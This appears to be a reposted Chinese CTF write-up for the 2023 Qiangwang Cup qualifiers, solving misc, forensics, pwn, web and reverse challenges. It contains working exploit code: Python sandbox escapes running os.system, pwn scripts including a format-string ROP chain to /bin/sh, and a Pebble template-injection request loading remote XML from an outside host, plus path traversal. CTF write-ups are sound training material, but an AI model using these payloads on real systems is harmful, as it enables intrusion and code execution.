<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>2023年第七届强网杯初赛 WP - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="2023年第七届强网杯初赛 WP" />
<meta property="og:description" content="MISC easyfuzz 1、通过尝试输入字符串判断该程序对输入字符的验证规则为9位字符，并且只要满足输入正确字符使最后返回值全部为111111111即可得flag
继续大胆猜测并尝试，发现前两位字符可以为任何字符，都满足110000000，由此可以对后七位字符进行爆破
2、逐位爆破，验证思路正确，最后一位为字符串&#34;d&#34;
3、编写爆破脚本，当字符串长度为9位并输入时，将回显不为“Here is your code coverage: 110000000”的结果打印，脚本如下
from pwn import * from string import printable conn = remote(&#39;101.200.122.251&#39;, 12199) non_matching_strings = [] for i in range(9): for char in printable: payload = &#39;a&#39;*i &#43; char &#43; &#39;a&#39;*(8-i) print(conn.recvuntil(b&#39;Enter a string (should be less than 10 bytes):&#39;)) conn.sendline(payload.encode()) response = conn.recvline().decode().strip() if response != &#34;Here is your code coverage: 110000000&#34;: non_matching_strings.append(payload) for string in non_matching_strings: print(string) FLAG：qwb{YouKnowHowToFuzz!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/95c1a595b1bb65d7f84da52df9b340c8/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-22T22:31:10+08:00" />
<meta property="article:modified_time" content="2023-12-22T22:31:10+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">2023年第七届强网杯初赛 WP</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h4>MISC</h4> 
<h5>easyfuzz</h5> 
<p>1、通过尝试输入字符串判断该程序对输入字符的验证规则为9位字符，并且只要满足输入正确字符使最后返回值全部为111111111即可得flag</p> 
<p></p> 
<p class="img-center"><img alt="" height="375" src="https://images2.imgbox.com/23/c8/7cS0giL7_o.jpg" width="984"></p> 
<p>继续大胆猜测并尝试，发现前两位字符可以为任何字符，都满足110000000，由此可以对后七位字符进行爆破</p> 
<p></p> 
<p class="img-center"><img alt="" height="104" src="https://images2.imgbox.com/f9/98/8tae6Gv3_o.png" width="737"></p> 
<p>2、逐位爆破，验证思路正确，最后一位为字符串"d"</p> 
<p></p> 
<p class="img-center"><img alt="" height="249" src="https://images2.imgbox.com/e1/93/BLwGYHYm_o.png" width="822"></p> 
<p>3、编写爆破脚本，当字符串长度为9位并输入时，将回显不为“Here is your code coverage: 110000000”的结果打印，脚本如下</p> 
<pre>from pwn import *</pre> 
<pre>from string import printable</pre> 
<pre>conn = remote('101.200.122.251', 12199)</pre> 
<pre>non_matching_strings = []</pre> 
<pre>for i in range(9):</pre> 
<pre>    for char in printable:</pre> 
<pre>        payload = 'a'*i + char + 'a'*(8-i)</pre> 
<pre>        print(conn.recvuntil(b'Enter a string (should be less than 10 bytes):'))</pre> 
<pre>        conn.sendline(payload.encode())</pre> 
<pre>        response = conn.recvline().decode().strip()</pre> 
<pre>        if response != "Here is your code coverage: 110000000":</pre> 
<pre>            non_matching_strings.append(payload)</pre> 
<pre>for string in non_matching_strings:</pre> 
<pre>    print(string)</pre> 
<pre></pre> 
<pre>FLAG：qwb{YouKnowHowToFuzz!}</pre> 
<h5>签到</h5> 
<pre>flag{welcome_to_qwb_2023}</pre> 
<h5>Pyjail ! It's myFILTER !!!</h5> 
<p>Python沙箱逃逸，闭合之后open直接读environ得到flag</p> 
<pre>{13212}'+(print(open('/proc/1/environ').read()))+'</pre> 
<pre> 或者使用payload:</pre> 
<pre>{print(open("/proc/1/environ").read())}</pre> 
<p></p> 
<p class="img-center"><img alt="" height="783" src="https://images2.imgbox.com/39/ad/Xeaacyfv_o.jpg" width="1200"></p> 
<p></p> 
<p class="img-center"><img alt="" height="167" src="https://images2.imgbox.com/d2/4a/CRVaCaeZ_o.jpg" width="1200"></p> 
<pre>flag{61e81b4f-566c-49f5-84dd-d79319fddc82}</pre> 
<h5><strong>Pyjail ! It's myRevenge !!!</strong></h5> 
<p>Python沙箱逃逸</p> 
<p>用write写文件import os;os.system(“nl fl* &gt;hzy”)执行之后再用read读取执行内容得到flag</p> 
<p>过滤字符全用八进制绕过，分段写</p> 
<pre>{13212}'+(open('wsy', "a").write('151155160157162'))+'{13212}'+(open('wsy', "a").write('t 157'))+'{13212}'+(open('wsy', "a").write('163;157'))+'{13212}'+(open('wsy', "a").write('163.'))+'{13212}'+(open('wsy', "a").write('163y'))+'{13212}'+(open('wsy', "a").write('st'))+'{13212}'+(open('wsy', "a").write('em("nl 146*&gt;hzy")'))+'{13212}'+open('143157de.py','w').write(open('wsy').read())+'{13212}'+(print(open('hzy').read()))+'</pre> 
<pre>或者依次执行下面poc:</pre> 
<pre>{globals().update(dict(my_filter=lambda x:1))}''{in''put()}'#</pre> 
<pre>{globals().update(dict(len=lambda x:0))}''{in''put()}'#</pre> 
<pre>{print("".__class__.__mro__[1].__subclasses__()[137].__init__.__globals__["__builtins__"]["__import__"]("os").listdir())}</pre> 
<pre>['flag_26F574F8CEE82D06FEDC45CF5916B86A732DD326CE1CB2C9A96751E072D0A104', 'server_8F6C72124774022B.py']</pre> 
<pre>{globals().update(dict(my_filter=lambda x:1))}''{in' 'put()}'# </pre> 
<pre>{globals(). update(dict(len=lambda x:0))}''{in' 'put()}'#</pre> 
<pre>{print (open("flag_26F574F8CEE82D06FEDC45CF5916B86A732DD326CE1CB2C9A96751E072D0A104"). read())}</pre> 
<p></p> 
<p class="img-center"><img alt="" height="811" src="https://images2.imgbox.com/b6/43/fPokld7D_o.jpg" width="1200"></p> 
<p></p> 
<pre>flag{8f0a4ac2-52d3-4adb-a1a3-47e05997817d}</pre> 
<h5>Wabby Wabbo Radio</h5> 
<p>f12可以拿到wav的链接/static/audios/xh4.wav</p> 
<p></p> 
<p class="img-center"><img alt="" height="545" src="https://images2.imgbox.com/2b/22/F0Hpkqcr_o.jpg" width="1200"></p> 
<p>重新刷新了一下发现是随机选取播放的</p> 
<p>fuzz了一下总共有xh1-xh5和hint1-hint2以及flag.wav</p> 
<p>每一个wav的左声道显然是莫斯</p> 
<p></p> 
<p></p> 
<p class="img-center"><img alt="" height="171" src="https://images2.imgbox.com/5d/c9/b5x72tui_o.jpg" width="1200"></p> 
<p></p> 
<p>分离声道，增幅，在线网站解一下</p> 
<p>https://morsecode.world/international/decoder/audio-decoder-adaptive.html</p> 
<p>得到：</p> 
<pre>Do you want a flag? Let's listen a little longer.Genshin Impact starts.The weather is really nice today. It's a great day to listen to the Wabby Wabbo radio.If you don't know how to do it, you can go ahead and do something else first.may be flag is png picturedo you know QAM?</pre> 
<p>其他都没啥用，就一个提示了QAM载波幅度</p> 
<p>https://info.support.huawei.com/info-finder/encyclopedia/zh/QAM.html#Qam的星座图</p> 
<p>简单了解了一下发现可以通过振幅来区分01，尝试打印了一下振幅，发现刚好都是集中在±1，±3之间</p> 
<p></p> 
<p class="img-center"><img alt="" height="674" src="https://images2.imgbox.com/b1/26/LvMK1rNr_o.jpg" width="545"></p> 
<p>对比16QAM的星座图可以发现振幅拼一起刚好能起到一个信号的对应关系，但是不知道具体的对应关系是啥，直接盲猜一手从小到大，</p> 
<p>简单的脚本如下：</p> 
<pre>import scipy.io.wavfile as wav</pre> 
<pre>import numpy as np</pre> 
<pre>import sys</pre> 
<pre></pre> 
<pre>sample_rate, data = wav.read("flag.wav")</pre> 
<pre>for i in data:</pre> 
<pre>    print(i)</pre> 
<pre>flag=''</pre> 
<pre>def repla(n):</pre> 
<pre>    if n == -3:</pre> 
<pre>        return '00'</pre> 
<pre>    elif n == -1:</pre> 
<pre>        return '01'</pre> 
<pre>    elif n == 1:</pre> 
<pre>        return '10'</pre> 
<pre>    elif n == 3:</pre> 
<pre>        return '11'</pre> 
<pre></pre> 
<pre>for x, y in data:</pre> 
<pre>    n1 = round(float(x))</pre> 
<pre>    n2 = round(float(y))</pre> 
<pre>    flag += repla(n1)</pre> 
<pre>    flag += repla(n2)</pre> 
<h4>print(flag)</h4> 
<p></p> 
<p class="img-center"><img alt="" height="565" src="https://images2.imgbox.com/67/2b/pYoduYTL_o.jpg" width="1200"></p> 
<h5>谍影重重3.0</h5> 
<p>给了hint：纸飞机他也是飞机，也能飞出国境抵达大洋彼岸,结合题目描述特殊隧道很容易联想到是vpn</p> 
<p>稍微搜一下就可以得到是Shadowsks,参考文章：</p> 
<p>https://phuker.github.io/posts/Shadowsks-active-probing.html</p> 
<p>给出了完整解密脚本，但是不知道key，直接爆破一下，用HTTP当作请求成功的标识</p> 
<pre>#!/usr/bin/env python3</pre> 
<pre># encoding: utf-8</pre> 
<pre></pre> 
<pre>import os</pre> 
<pre>import sys</pre> 
<pre>import logging</pre> 
<pre>import hashlib</pre> 
<pre></pre> 
<pre>from Crypto.Cipher import AES</pre> 
<pre></pre> 
<pre>logging.basicConfig(level=logging.INFO)</pre> 
<pre></pre> 
<pre></pre> 
<pre>def EVP_BytesToKey(password, key_len, iv_len):</pre> 
<pre>    m = []</pre> 
<pre>    i = 0</pre> 
<pre>    while len(b''.join(m)) &lt; (key_len + iv_len):</pre> 
<pre>        md5 = hashlib.md5()</pre> 
<pre>        data = password</pre> 
<pre>        if i &gt; 0:</pre> 
<pre>            data = m[i - 1] + password</pre> 
<pre>        md5.update(data)</pre> 
<pre>        m.append(md5.digest())</pre> 
<pre>        i += 1</pre> 
<pre>    ms = b''.join(m)</pre> 
<pre>    key = ms[:key_len]</pre> 
<pre>    iv = ms[key_len:key_len + iv_len]</pre> 
<pre></pre> 
<pre>    return key, iv</pre> 
<pre></pre> 
<pre>def decrypt(cipher,password):</pre> 
<pre>    key_len = int(256/8)</pre> 
<pre>    iv_len = 16</pre> 
<pre>    mode = AES.MODE_CFB</pre> 
<pre></pre> 
<pre>    key, _ = EVP_BytesToKey(password, key_len, iv_len)</pre> 
<pre>    cipher = bytes.fromhex(cipher)</pre> 
<pre>    iv = cipher[:iv_len]</pre> 
<pre>    real_cipher = cipher[iv_len:]</pre> 
<pre></pre> 
<pre>    obj = AES.new(key, mode, iv, segment_size=128)</pre> 
<pre>    plain = obj.decrypt(real_cipher)</pre> 
<pre></pre> 
<pre>    return plain</pre> 
<pre></pre> 
<pre></pre> 
<pre>def main():</pre> 
<pre>    # test http request</pre> 
<pre>    cipher = 'e0a77dfafb6948728ef45033116b34fc855e7ac8570caed829ca9b4c32c2f6f79184e333445c6027e18a6b53253dca03c6c464b8289cb7a16aa1766e6a0325ee842f9a766b81039fe50c5da12dfaa89eacce17b11ba9748899b49b071851040245fa5ea1312180def3d7c0f5af6973433544a8a342e8fcd2b1759086ead124e39a8b3e2f6dc5d56ad7e8548569eae98ec363f87930d4af80e984d0103036a91be4ad76f0cfb00206'</pre> 
<pre></pre> 
<pre>    with open('rockyou.txt','rb') as f:</pre> 
<pre>        lines = f.readlines()</pre> 
<pre>    for password in lines:</pre> 
<pre>        plain = decrypt(cipher,password.strip())</pre> 
<pre>        if b'HTTP' in plain:</pre> 
<pre>            print(password,plain)</pre> 
<pre></pre> 
<pre>if __name__ == "__main__":</pre> 
<pre>    main()</pre> 
<pre></pre> 
<pre>#b'superman\n' b'\x03\x0f192.168.159.131\x00PGET /Why-do-you-want-to-know-what-this-is HTTP/1.1\r\nHost: 192.168.159.131\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nConnection: close\r\n\r\n'</pre> 
<p>得到文件名为Why-do-you-want-to-know-what-this-is，md5后得到flag</p> 
<pre>flag{dc7e57298e65949102c17596f1934a97}</pre> 
<h5>谍影重重2.0</h5> 
<p>根据题目描述飞机流量可以很容易联想到ADS-B协议</p> 
<p>导出tcp流数据</p> 
<pre>tshark -r attach.pcapng -Y "tcp" -T fields -e tcp.segment_data &gt; tcp.txt</pre> 
<p>解析脚本：</p> 
<pre>import pyModeS</pre> 
<pre></pre> 
<pre>with open('tcp.txt','r')as f:</pre> 
<pre>    lines = f.readlines()</pre> 
<pre>for data in lines:</pre> 
<pre>    if len(data)==47:</pre> 
<pre>        print(pyModeS.decoder.tell(data[18:]))</pre> 
<p>筛选一下Airborne velocity ，得到79a05e的飞机速度最快为371 knots，md5 ICAO address为flag</p> 
<p></p> 
<p class="img-center"><img alt="" height="521" src="https://images2.imgbox.com/76/0b/UbnDvX47_o.jpg" width="990"></p> 
<pre>或者</pre> 
<p>将数据包导出为json格式</p> 
<p></p> 
<p></p> 
<p class="img-center"><img alt="" height="760" src="https://images2.imgbox.com/b3/cc/67fQdZf9_o.png" width="1200"></p> 
<p></p> 
<p>使用脚本提取字段并进行MD5</p> 
<pre>import json</pre> 
<pre>import pyModeS as pms</pre> 
<pre>import hashlib</pre> 
<pre></pre> 
<pre>with open('123.json', 'r', encoding='utf-8') as file:</pre> 
<pre>    data = json.load(file)</pre> 
<pre></pre> 
<pre>info = []</pre> 
<pre>for packet in data:</pre> 
<pre>    if 'layers' in packet['_source'] and 'tcp' in packet['_source']['layers']:</pre> 
<pre>        tcp_layer = packet['_source']['layers']['tcp']</pre> 
<pre></pre> 
<pre>        if 'tcp.payload' in tcp_layer:</pre> 
<pre>            tcp_payload = tcp_layer['tcp.payload'].replace(':','')</pre> 
<pre>            info.append(tcp_payload)</pre> 
<pre></pre> 
<pre>planes_data = []</pre> 
<pre></pre> 
<pre>for i in info:</pre> 
<pre>    msg = i[18:]</pre> 
<pre>    if pms.adsb.typecode(msg) &gt;= 19 and pms.adsb.typecode(msg) &lt;= 22:</pre> 
<pre>        icao = pms.adsb.icao(msg)</pre> 
<pre>        velocity_info = pms.adsb.velocity(msg)</pre> 
<pre>        speed, track, vertical_rate, _ = velocity_info</pre> 
<pre></pre> 
<pre>        plane_info = {"icao": icao, "speed": speed, "track": track, "vertical_rate": vertical_rate}</pre> 
<pre>        planes_data.append(plane_info)</pre> 
<pre></pre> 
<pre>fastest_plane = max(planes_data, key=lambda x: x['speed'])</pre> 
<pre>print(hashlib.md5(fastest_plane['icao'].upper().encode()).hexdigest())</pre> 
<pre>#flag{4cf6729b9bc05686a79c1620b0b1967b}</pre> 
<h5>happy chess</h5> 
<p>应该是非预期，随便输入9个任意位置直接exit掉该轮就算成功了</p> 
<p></p> 
<p class="img-center"><img alt="" height="251" src="https://images2.imgbox.com/d8/4b/8F1EnOXp_o.jpg" width="805"></p> 
<p></p> 
<h4>强网先锋</h4> 
<h5>speedup</h5> 
<p>纯社工题，要求2的27次方的阶乘的逐位之和，OEIS上直接有这一个值了</p> 
<p>https://oeis.org/A244060/list</p> 
<p></p> 
<p class="img-center"><a href="https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/1-1702891880.png" rel="nofollow"><img alt="2023 强网杯 writeup by Arr3stY0u" height="912" src="https://images2.imgbox.com/d1/8c/l4F2hb8A_o.png" width="604"></a></p> 
<p>sha256后得到flag</p> 
<pre>flag{bbdee5c548fddfc76617c562952a3a3b03d423985c095521a8661d248fad3797}</pre> 
<h5>找到PNG了吗</h5> 
<pre>strings main.mem | grep "Linux version"</pre> 
<p></p> 
<p class="img-center"><img alt="" height="409" src="https://images2.imgbox.com/95/4d/fAsFPmd5_o.jpg" width="1200"></p> 
<p>拿到内核版本后照着</p> 
<p>https://treasure-house.randark.site/blog/2023-10-25-MemoryForensic-Test/</p> 
<p>做个linux的profile</p> 
<pre>python2 vol.py -f C:Users22826Desktopmain.mem --profile=LinuxUbuntu2004x64 linux_find_file -L | findstr "Desktop"</pre> 
<p>桌面上能找到个文件have_your_fun.jocker</p> 
<p></p> 
<p class="img-center"><img alt="" height="563" src="https://images2.imgbox.com/9e/e6/VrkseJ3S_o.jpg" width="1200"></p> 
<p>尝试导出，但为空</p> 
<pre>python2 vol.py -f C:Users22826Desktopmain.mem --profile=LinuxUbuntu2004x64 linux_find_file -i 0xffff9ce28fe300e8 -Ohave_your_fun.jocker</pre> 
<p>不知道如何恢复，直接尝试全局搜一下文件名</p> 
<p>找到一个加密脚本，简单的两次rc4加密，key都给了</p> 
<p>根据题目需要找png，可以猜测have_your_fun.jocker就是加密后的png</p> 
<p></p> 
<p class="img-center"><a href="https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/7-1702891884.png" rel="nofollow"><img alt="2023 强网杯 writeup by Arr3stY0u" height="1200" src="https://images2.imgbox.com/1a/43/tHXKSxzZ_o.png" width="996"></a></p> 
<p>直接加密一下png头</p> 
<p></p> 
<p class="img-center"><a href="https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/1-1702891885.png" rel="nofollow"><img alt="2023 强网杯 writeup by Arr3stY0u" height="808" src="https://images2.imgbox.com/4d/14/ndCQ4GmS_o.png" width="1050"></a></p> 
<p>可以直接定位到内存中残留的have_your_fun.jocker位置</p> 
<p></p> 
<p class="img-center"><a href="https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/7-1702891885.png" rel="nofollow"><img alt="2023 强网杯 writeup by Arr3stY0u" height="692" src="https://images2.imgbox.com/e7/db/4eQVnOYi_o.png" width="890"></a></p> 
<p>直接解密得到flag图</p> 
<p></p> 
<p class="img-center"><a href="https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/4-1702891886.png" rel="nofollow"><img alt="2023 强网杯 writeup by Arr3stY0u" height="542" src="https://images2.imgbox.com/f7/1c/haQ6gZgf_o.png" width="1080"></a></p> 
<pre>flag{It's_So_Hard_To_Find_A_Picture}</pre> 
<h5>trie</h5> 
<p>题目分析</p> 
<p>–在构建路由表使用了字典树数据结构，每次遇到新ip会插入分支，并且其节点值赋值为tot</p> 
<p>–查询时也是查找该字典树，取节点的tot为索引，打印四字节end[tot]</p> 
<p>思路分析</p> 
<p>–在add时使用完tot之后没有归零，导致在view时读取溢出部分数据（能够读取到secret上的flag），每次读取逆序4字节，将ascii码转成对应字符拼接即可。</p> 
<p>–同时为了获取完整flag，每次需要使得search函数里查询得到的tot索引+1，为此需要构造一颗子树，使其空出若干个叶子，（每空出一个叶子即可打印4字节flag）</p> 
<p>–我构造了一个空出9个叶子的节点，其中包含一个填充的（目的是使得tot至少为0x40）</p> 
<p></p> 
<p class="img-center"><a href="https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/6-1702891887.png" rel="nofollow"><img alt="2023 强网杯 writeup by Arr3stY0u" height="558" src="https://images2.imgbox.com/6b/2c/2FjMd6Hj_o.png" width="967"></a></p> 
<p>exp</p> 
<pre> #!/usr/bin/env python3</pre> 
<pre></pre> 
<pre>from pwncli import *</pre> 
<pre></pre> 
<pre>cli_script()</pre> 
<pre></pre> 
<pre>io: tube = gift.io</pre> 
<pre>elf: ELF = gift.elf</pre> 
<pre>libc: ELF = gift.libc</pre> 
<pre>context.arch = "amd64"</pre> 
<pre></pre> 
<pre></pre> 
<pre>def add(des, next):</pre> 
<pre>    io.recvuntil(b"4. Quit.")</pre> 
<pre>    io.sendline(b"1")</pre> 
<pre>    io.recvuntil(b"Input destination IP:")</pre> 
<pre>    io.sendline(des)</pre> 
<pre>    io.recvuntil(b"Input the next hop:")</pre> 
<pre>    io.sendline(next)</pre> 
<pre></pre> 
<pre></pre> 
<pre>def show(des):</pre> 
<pre>    io.recvuntil(b"4. Quit.")</pre> 
<pre>    io.sendline(b"2")</pre> 
<pre>    io.recvuntil(b"Input destination IP:")</pre> 
<pre>    io.sendline(des)</pre> 
<pre></pre> 
<pre></pre> 
<pre>def get_flag():</pre> 
<pre>    io.recvuntil(b"4. Quit.")</pre> 
<pre>    io.sendline(b"3")</pre> 
<pre></pre> 
<pre></pre> 
<pre>def leak(data):</pre> 
<pre>    add(str(data).encode() + b".0.0.0", b"0.0.0.0")</pre> 
<pre>    get_flag()</pre> 
<pre>    show(str(data).encode() + b".0.0.0")</pre> 
<pre>    io.recvuntil(b"The next hop is ")</pre> 
<pre>    info = io.recvuntil(b"\n", drop=True)</pre> 
<pre>    parts = info.split(b".")</pre> 
<pre>    parts = parts[::-1]</pre> 
<pre>    ascii_values = [chr(int(part)) for part in parts]</pre> 
<pre>    ascii_values = "".join(ascii_values)</pre> 
<pre>    flag = ascii_values</pre> 
<pre>    return flag</pre> 
<pre></pre> 
<pre></pre> 
<pre>add("0.0.0.0", "0.0.0.0")  # 32</pre> 
<pre>add("64.0.0.0", "0.0.0.0")  # 2</pre> 
<pre>add("32.0.0.0", "0.0.0.0")  # 3</pre> 
<pre>add("96.0.0.0", "0.0.0.0")  # 2</pre> 
<pre>add("16.0.0.0", "0.0.0.0")  # 4</pre> 
<pre>add("80.0.0.0", "0.0.0.0")  # 2</pre> 
<pre>add("48.0.0.0", "0.0.0.0")  # 3</pre> 
<pre>add("112.0.0.0", "0.0.0.0")  # 2</pre> 
<pre>add("0.4.0.0", "0.0.0.0")  # 14</pre> 
<pre></pre> 
<pre>flag = ""</pre> 
<pre>get_flag()</pre> 
<pre>show(b"0.4.0.0")  # 0x40</pre> 
<pre>io.recvuntil(b"The next hop is ")</pre> 
<pre>info = io.recvuntil(b"\n", drop=True)</pre> 
<pre>parts = info.split(b".")</pre> 
<pre>parts = parts[::-1]</pre> 
<pre>ascii_values = [chr(int(part)) for part in parts]</pre> 
<pre>ascii_values = "".join(ascii_values)</pre> 
<pre>flag += ascii_values</pre> 
<pre>log.success(flag)</pre> 
<pre></pre> 
<pre>flag += leak(128)</pre> 
<pre>log.success(flag)</pre> 
<pre></pre> 
<pre>flag += leak(192)</pre> 
<pre>log.success(flag)</pre> 
<pre></pre> 
<pre>flag += leak(160)</pre> 
<pre>log.success(flag)</pre> 
<pre></pre> 
<pre>flag += leak(144)</pre> 
<pre>log.success(flag)</pre> 
<pre></pre> 
<pre>flag += leak(208)</pre> 
<pre>log.success(flag)</pre> 
<pre></pre> 
<pre>flag += leak(176)</pre> 
<pre>log.success(flag)</pre> 
<pre></pre> 
<pre>flag += leak(240)</pre> 
<pre>log.success(flag)</pre> 
<pre></pre> 
<pre>flag += leak(224)</pre> 
<pre>log.success(flag)</pre> 
<pre></pre> 
<pre>add(b"128.4.0.0", b"0.0.0.0")</pre> 
<pre>get_flag()</pre> 
<pre>show(b"128.4.0.0")  # 0x40</pre> 
<pre>io.recvuntil(b"The next hop is ")</pre> 
<pre>info = io.recvuntil(b"\n", drop=True)</pre> 
<pre>parts = info.split(b".")</pre> 
<pre>parts = parts[::-1]</pre> 
<pre>ascii_values = [chr(int(part)) for part in parts]</pre> 
<pre>ascii_values = "".join(ascii_values)</pre> 
<pre>flag += ascii_values</pre> 
<pre>log.success(flag)</pre> 
<pre>io.interactive()</pre> 
<p></p> 
<p class="img-center"><a href="https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/7-1702891888.png" rel="nofollow"><img alt="2023 强网杯 writeup by Arr3stY0u" height="352" src="https://images2.imgbox.com/c7/93/Y0SQWFvw_o.png" width="1080"></a></p> 
<h5>ez_fmt</h5> 
<p>格式化字符串打printf的返回地址为csu的部分gadget，然后执行跳转magic_read（0x401205）执行rop链。</p> 
<pre>#!/usr/bin/env python3</pre> 
<pre>'''</pre> 
<pre>Author:7resp4ss</pre> 
<pre>Date:2023-12-16 13:34:34</pre> 
<pre>Usage:</pre> 
<pre>    Debug : python3 exp.py debug elf-file-path -t -b malloc</pre> 
<pre>    Remote: python3 exp.py remote elf-file-path ip:port</pre> 
<pre>'''</pre> 
<pre></pre> 
<pre>from pwncli import *</pre> 
<pre>cli_script()</pre> 
<pre></pre> 
<pre></pre> 
<pre>io: tube = gift.io</pre> 
<pre>elf: ELF = gift.elf</pre> 
<pre>libc: ELF = gift.libc</pre> 
<pre></pre> 
<pre>filename  = gift.filename # current filename</pre> 
<pre>is_debug  = gift.debug # is debug or not </pre> 
<pre>is_remote = gift.remote # is remote or not</pre> 
<pre>gdb_pid   = gift.gdb_pid # gdb pid if debug</pre> 
<pre></pre> 
<pre>ru('There is a gift for you ')</pre> 
<pre>leak_stack  = int(rl()[:-1],16)</pre> 
<pre>leak_ex2(leak_stack)</pre> 
<pre></pre> 
<pre></pre> 
<pre>attack_stack = leak_stack - 0x8</pre> 
<pre>pd = flat(</pre> 
<pre>    {<!-- --></pre> 
<pre>        0:'%' + str(0xce) + 'c' + '%11$hhn%19$p',</pre> 
<pre>        0x18:[0x401205],</pre> 
<pre>        0x28:attack_stack,</pre> 
<pre>    }</pre> 
<pre>)</pre> 
<pre>s(pd)</pre> 
<pre>ru('0x')</pre> 
<pre>leak_libc = int(r(12),16)</pre> 
<pre>leak_ex2(leak_libc)</pre> 
<pre>lb = leak_libc - 0x24083</pre> 
<pre>libc.address = lb</pre> 
<pre></pre> 
<pre>pd = flat(</pre> 
<pre>    {<!-- --></pre> 
<pre>        0x18:[</pre> 
<pre>            CG.pop_rdi_ret(),</pre> 
<pre>            CG.bin_sh(),</pre> 
<pre>            lb + 0x51cd2]</pre> 
<pre>    }</pre> 
<pre>)</pre> 
<pre>S()</pre> 
<pre>s(pd)</pre> 
<pre></pre> 
<pre>ia()</pre> 
<h5>hello spring</h5> 
<p>审计源码后发现是pepple的模板注入</p> 
<p>发现过滤了</p> 
<pre>org.springframework.context.support.ClassPathXmlApplicationContext</pre> 
<p>用字符串拼接的方式绕过</p> 
<pre>org.springframework.context."+"support.ClassPathXmlApplicationContext</pre> 
<p>上传payload如下</p> 
<pre>POST /uploadFile HTTP/1.1</pre> 
<pre>Host: eci-2ze7ksohishwh34f2u43.cloudeci1.ichunqiu.com:8088</pre> 
<pre>Cache-Control: max-age=0</pre> 
<pre>Upgrade-Insecure-Requests: 1</pre> 
<pre>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</pre> 
<pre>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</pre> 
<pre>Accept-Encoding: gzip, deflate</pre> 
<pre>Accept-Language: zh-CN,zh;q=0.9</pre> 
<pre>Connection: close</pre> 
<pre>Content-Type: application/x-www-form-urlencoded</pre> 
<pre>Content-Length: 567</pre> 
<pre></pre> 
<pre>content=%7B%25%20set%20y%3D%20beans.get(%22org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory%22).resourceLoader.classLoader.loadClass(%22java.beans.Beans%22)%20%25%7D%0A%7B%25%20set%20yy%20%3D%20%20beans.get(%22jacksonObjectMapper%22).readValue(%22%7B%7D%22%2C%20y)%20%25%7D%0A%7B%25%20set%20yyy%20%3D%20yy.instantiate(null%2C%22org.springframework%22%2B%22.context.support.ClassPathXmlApplicationContext%22)%20%25%7D%0A%7B%7B%20yyy.setConfigLocation(%22http%3A%2F%2F47.76.178.89%3A8081%2F1.xml%22)%20%7D%7D%0A%7B%7B%20yyy.refresh()%20%7D%7D</pre> 
<p>上传的文件名与时间有关，并且题目环境的时间与现实不一样</p> 
<pre>public static String general_time() {<!-- --></pre> 
<pre>    LocalDateTime currentTime = LocalDateTime.now();</pre> 
<pre>    DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyyMMdd_HHmmss");</pre> 
<pre>    String var10000 = currentTime.format(formatter);</pre> 
<pre>    String fileName = "file_" + var10000 + ".pebble";</pre> 
<pre>    System.out.println("filename is " + fileName);</pre> 
<pre>    return fileName;</pre> 
<pre>}</pre> 
<p></p> 
<p></p> 
<p class="img-center"><img alt="" height="556" src="https://images2.imgbox.com/92/23/SbAzZIKm_o.jpg" width="1200"></p> 
<p></p> 
<p>那么文件名就为 file_20231217_160502，发送payload去触发该点</p> 
<pre>GET /?x=../../../../../../../../tmp/file_20231217_160502 HTTP/1.1</pre> 
<pre>Host: eci-2ze7ksohishwh34f2u43.cloudeci1.ichunqiu.com:8088</pre> 
<pre>Cache-Control: max-age=0</pre> 
<pre>Upgrade-Insecure-Requests: 1</pre> 
<pre>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</pre> 
<pre>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</pre> 
<pre>Accept-Encoding: gzip, deflate</pre> 
<pre>Accept-Language: zh-CN,zh;q=0.9</pre> 
<pre>Connection: close</pre> 
<p></p> 
<p></p> 
<p class="img-center"><img alt="" height="160" src="https://images2.imgbox.com/4c/d9/srBZABlF_o.jpg" width="1094"></p> 
<p></p> 
<h5>babyre</h5> 
<p>调试发现密钥和密文都变了</p> 
<p></p> 
<p></p> 
<p class="img-center"><img alt="" height="572" src="https://images2.imgbox.com/f5/87/Ua4O1kOh_o.jpg" width="1142"></p> 
<p></p> 
<p>加解密过程对应着修改</p> 
<p></p> 
<p></p> 
